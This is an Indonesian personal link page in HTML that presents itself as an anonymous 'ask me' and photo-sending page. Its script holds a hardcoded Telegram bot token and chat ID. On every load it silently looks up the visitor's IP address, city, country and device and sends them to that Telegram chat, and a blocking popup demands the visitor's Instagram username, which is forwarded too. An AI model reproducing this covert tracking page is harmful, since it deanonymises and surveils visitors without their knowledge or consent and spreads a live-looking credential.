<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>im4mdv</title>
  <style>
    :root{--bg:#0b0b0d;--card:#111214;--muted:#9aa0a6;--accent:#c56cff}
    *{box-sizing:border-box}
    body{
      margin:0;font-family:Inter,system-ui,Arial,sans-serif;
      background:linear-gradient(180deg,#050507 0%, #0b0b0d 100%);
      color:#fff;min-height:100vh;display:flex;align-items:center;
      justify-content:center;padding:24px
    }
    .wrap{width:100%;max-width:760px}
    .card{background:var(--card);border-radius:14px;padding:28px;
          box-shadow:0 6px 20px rgba(0,0,0,0.6)}
    .head{display:flex;gap:16px;align-items:center}
    .avatar img{width:84px;height:84px;border-radius:14px;object-fit:cover}
    h1{margin:0;font-size:20px}
    p.tag{margin:6px 0 0;color:var(--muted)}
    .btns{display:flex;flex-direction:column;gap:12px;margin-top:18px}
    .btn{display:flex;align-items:center;gap:12px;padding:12px 14px;
         background:transparent;border:1px solid rgba(255,255,255,0.06);
         border-radius:10px;color:#fff;text-decoration:none;cursor:pointer}
    .btn small{color:var(--muted);font-size:13px;margin-left:auto}
    .btn:hover{border-color:rgba(197,108,255,0.2);transform:translateY(-3px)}
    .music{margin-top:18px;border:1px solid rgba(255,255,255,0.05);
           border-radius:12px;padding:16px;text-align:center}
    .note{color:var(--muted);font-size:13px;margin-top:12px}
    .footer{margin-top:18px;color:var(--muted);font-size:13px;text-align:center}
    input,textarea{width:100%;padding:10px;border-radius:8px;
                   background:#060607;border:1px solid rgba(255,255,255,0.05);
                   color:#fff}
    .modal{position:fixed;inset:0;display:flex;align-items:center;
           justify-content:center;background:rgba(0,0,0,0.6);
           visibility:hidden;opacity:0;transition:0.18s}
    .modal.show{visibility:visible;opacity:1}
    .panel{background:#0b0b0d;padding:16px;border-radius:10px;
           width:90%;max-width:520px;border:1px solid rgba(255,255,255,0.04)}
    .tiny{font-size:12px;color:var(--muted)}
    .butterfly {
      position: absolute;
      font-size: 22px;
      color: #4cc9ff;
      opacity: 0.9;
      pointer-events: none;
      user-select: none;
      z-index: 9;
      will-change: transform;
      transition: transform 0.1s ease;
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="head">
        <div class="avatar">
          <img src="https://i.imgur.com/S1gkBZn.jpeg" alt="im4mdv">
        </div>
        <div>
          <h1>im4mdv</h1>
          <p class="tag">sharing vibes & question ‚òÅÔ∏è</p>
        </div>
      </div>

      <div class="btns">
        <a class="btn" href="https://www.tiktok.com/@koplingterus" target="_blank">
          ‚ö° TikTok<small>@koplingterus</small></a>
        <a class="btn" href="https://open.spotify.com/user/31ekkvvirtytc24a46swumscuv3e?si=NNMZyh0WTnSdYnOnh23jPQ" target="_blank">
          üéß Spotify<small>spotify.link/Djt4Dj7BvXb</small></a>
        <button class="btn" id="openAsk">‚úâÔ∏è Tanyakan sesuatu kepadaku</button>
      </div>

      <div class="music">
        <h3>üñºÔ∏è Kirim foto sesuatu?</h3>
        <p class="note">Unggah foto yang akan dikirimüì¨</p>
        <input type="file" id="photoInput" accept="image/*">
        <textarea id="caption" rows="2" placeholder="Tulis pesan ya!"></textarea>
        <button class="btn" id="sendPhoto" style="margin-top:8px;">Kirim Foto</button>
        <div id="status" class="note"></div>
      </div>

      <div class="footer">im4mdv.question</div>
    </div>
  </div>

  <div class="modal" id="modal">
    <div class="panel">
      <h3>üìÆ Kirim pertanyaan</h3>
      <p class="tiny">Mau bertanya tentang aku?</p>
      <input id="qname" placeholder="Nama" />
      <textarea id="qtext" rows="4" placeholder="Tulis pertanyaan kamu..." required></textarea>
      <div style="display:flex;gap:8px;margin-top:8px">
        <button id="sendQ" class="btn">Kirim</button>
        <button id="closeQ" class="btn">Batal</button>
      </div>
      <div id="qmsg" class="tiny" style="margin-top:8px"></div>
    </div>
  </div>

  <audio id="bgmusic"
    src="https://hipstrumentals.com/wp-content/uploads/2025/07/Lil-Peep-Ft.-rainy-bear-nuts-Instrumental-Prod.-By-Willie-G.mp3"
    preload="auto" muted></audio>

  <button id="musicButton" style="
    position:fixed;bottom:20px;right:20px;
    background:rgba(30,144,255,0.3);
    color:#fff;border:1px solid rgba(255,255,255,0.4);
    border-radius:12px;padding:10px 16px;
    font-size:14px;cursor:pointer;
    backdrop-filter:blur(8px);
    display:none;z-index:9999;">
    üéß Tap untuk mulai musik
  </button>

  <div id="visitorInfo" style="display:none;"></div>

  <!-- üîí POPUP LOGIN -->
  <div id="blurOverlay" style="
    position:fixed;inset:0;
    backdrop-filter:blur(8px);
    background:rgba(0,0,0,0.55);
    display:flex;align-items:center;
    justify-content:center;
    z-index:999999;">
    <div style="
      background:rgba(20,20,20,0.85);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:20px;
      padding:25px;
      width:85%;max-width:340px;
      text-align:center;color:#fff;">
      <h3>Masukkan Username Instagram</h3>
      <input id="igInput" type="text" placeholder="@username" style="
        width:90%;padding:10px;border-radius:10px;border:none;
        background:rgba(255,255,255,0.1);
        color:#fff;text-align:center;font-size:15px;outline:none;">
      <button id="igSubmit" style="
        margin-top:15px;background:#4cc9ff;border:none;
        padding:10px 20px;border-radius:10px;
        color:#000;font-weight:bold;cursor:pointer;">Lanjut</button>
    </div>
  </div>

  <div id="igStatus" style="
    position:fixed;bottom:12px;left:14px;
    background:rgba(255,255,255,0.08);
    color:#c5c5c5;font-size:13px;border-radius:8px;
    padding:6px 10px;z-index:99999;
    font-family:monospace;cursor:pointer;display:none;">
  </div>

  <script>
    const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
    const CHAT_ID = "6864694275";

    /* musik */
    const music = document.getElementById('bgmusic');
    const btn = document.getElementById('musicButton');
    let started = false;
    music.volume = 0.4;
    document.addEventListener('click', startMusic, { once:true });
    document.addEventListener('touchstart', startMusic, { once:true });
    async function startMusic(){
      if(started)return;
      started=true;music.muted=false;
      try{await music.play();btn.style.display='none';}
      catch(err){btn.style.display='block';}
    }
    btn.onclick=()=>music.play();

    /* modal */
    const modal=document.getElementById('modal');
    document.getElementById('openAsk').onclick=()=>modal.classList.add('show');
    document.getElementById('closeQ').onclick=()=>modal.classList.remove('show');

    /* login username (versi fix total) */
    const overlay = document.getElementById("blurOverlay");
    const input = document.getElementById("igInput");
    const btnLogin = document.getElementById("igSubmit");
    const savedIG = localStorage.getItem("ig_user");

    function removeOverlay() {
      if (!overlay) return;
      overlay.style.transition = "opacity 0.3s ease";
      overlay.style.opacity = "0";
      overlay.style.pointerEvents = "none";
      setTimeout(() => {
        overlay.style.display = "none";
        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
      }, 300);
    }

    if (savedIG) {
      removeOverlay();
      showUserStatus(savedIG);
    }

    btnLogin.onclick = async () => {
      const username = input.value.trim();
      if (!username) {
        alert("Masukkan username dulu");
        return;
      }

      localStorage.setItem("ig_user", username);
      showUserStatus(username);
      removeOverlay();

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `üë§ Username login: ${username}`,
          }),
        });
      } catch (e) {
        console.log("Gagal kirim ke Telegram", e);
      }
    };

    function showUserStatus(name) {
      const el = document.getElementById("igStatus");
      el.textContent = `üëã Login sebagai ${name} (keluar)`;
      el.style.display = "block";
      el.onclick = () => {
        if (confirm("Keluar dan hapus username?")) {
          localStorage.removeItem("ig_user");
          el.textContent = "üîÑ Logout...";
          setTimeout(() => location.reload(), 600);
        }
      };
    }

    /* kirim pertanyaan */
    document.getElementById('sendQ').onclick=async()=>{
      const savedUser=localStorage.getItem("ig_user")||"Anonim";
      const text=document.getElementById('qtext').value.trim();
      const qmsg=document.getElementById('qmsg');
      if(!text){qmsg.textContent="Isi pertanyaan dulu.";return;}
      qmsg.textContent="Mengirim ...";
      try{
        const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {method:"POST",headers:{"Content-Type":"application/json"},
           body:JSON.stringify({chat_id:CHAT_ID,text:`üì© Pertanyaan dari ${savedUser}\n${text}`})});
        qmsg.textContent=res.ok?"‚úÖ Terkirim!":"‚ùå Gagal.";
        if(res.ok)setTimeout(()=>modal.classList.remove('show'),1000);
      }catch(e){qmsg.textContent="‚ö†Ô∏è Cek koneksi.";}
    };

    /* kirim foto */
    document.getElementById("sendPhoto").onclick=async()=>{
      const savedUser=localStorage.getItem("ig_user")||"Anonim";
      const file=document.getElementById("photoInput").files[0];
      const caption=document.getElementById("caption").value;
      const statusEl=document.getElementById("status");
      if(!file){statusEl.textContent="Pilih foto dulu.";return;}
      const fd=new FormData();
      fd.append("chat_id",CHAT_ID);
      fd.append("caption",`üì∏ Foto dari ${savedUser}\n${caption}`);
      fd.append("photo",file);
      statusEl.textContent="Mengirim ...";
      try{
        const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
        statusEl.textContent=res.ok?"‚úÖ Terkirim!":"‚ùå Gagal.";
      }catch(e){statusEl.textContent="‚ö†Ô∏è Koneksi lemah.";}
    };

    /* info umum pengunjung */
    async function showVisitorInfo(){
      const savedUser=localStorage.getItem("ig_user")||"Anonim";
      try{
        const r=await fetch("https://ipapi.co/json/");const d=await r.json();
        const now=new Date();
        const msg=`üì¢ Pengunjung Baru!\nüë§ ${savedUser}\nüåé ${d.city||"?"}, ${d.country_name||"?"}\nüíª ${/mobile/i.test(navigator.userAgent)?"Mobile":"Desktop"}\nüïì ${now.toLocaleString('id-ID')}\nüî¢ ${d.ip||"?"}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
          method:"POST",headers:{"Content-Type":"application/json"},
          body:JSON.stringify({chat_id:CHAT_ID,text:msg})
        });
      }catch(e){console.log("Gagal kirim info",e);}
    }
    showVisitorInfo();

    /* kupu-kupu */
    const area=document.querySelector('.card');
    const butterflies=[];const count=25;
    let hold=false,hx=0,hy=0;
    area.style.position='relative';area.style.overflow='hidden';
    function bounds(){const r=area.getBoundingClientRect();return{w:area.clientWidth,h:area.clientHeight,l:r.left,t:r.top};}
    for(let i=0;i<count;i++){
      const b=document.createElement("div");b.className="butterfly";b.textContent="ü¶ã";area.appendChild(b);
      butterflies.push({el:b,x:Math.random()*bounds().w,y:Math.random()*bounds().h,vx:(Math.random()-.5)*1.4,vy:(Math.random()-.5)*1.4,size:16+Math.random()*10});
      b.style.fontSize=butterflies[i].size+"px";
    }
    function move(){
      const r=bounds();
      butterflies.forEach(b=>{
        if(hold){const dx=hx-b.x,dy=hy-b.y;b.vx+=dx*0.005;b.vy+=dy*0.005;}
        b.x+=b.vx;b.y+=b.vy;
        if(b.x<=0||b.x>=r.w-b.size)b.vx*=-1;
        if(b.y<=0||b.y>=r.h-b.size)b.vy*=-1;
        b.vx=Math.max(-1.8,Math.min(1.8,b.vx));
        b.vy=Math.max(-1.8,Math.min(1.8,b.vy));
        b.el.style.left=b.x+"px";b.el.style.top=b.y+"px";
      });
      requestAnimationFrame(move);
    }move();
    area.addEventListener('mousedown',e=>{hold=true;hx=e.clientX-bounds().l;hy=e.clientY-bounds().t;});
    area.addEventListener('mouseup',()=>hold=false);
    area.addEventListener('mousemove',e=>{if(hold){hx=e.clientX-bounds().l;hy=e.clientY-bounds().t;}});
    area.addEventListener('touchstart',e=>{const t=e.touches[0];hold=true;hx=t.clientX-bounds().l;hy=t.clientY-bounds().t;});
    area.addEventListener('touchend',()=>hold=false);
    area.addEventListener('touchmove',e=>{if(hold){const t=e.touches[0];hx=t.clientX-bounds().l;hy=t.clientY-bounds().t;}});
  </script>
</body>
</html>
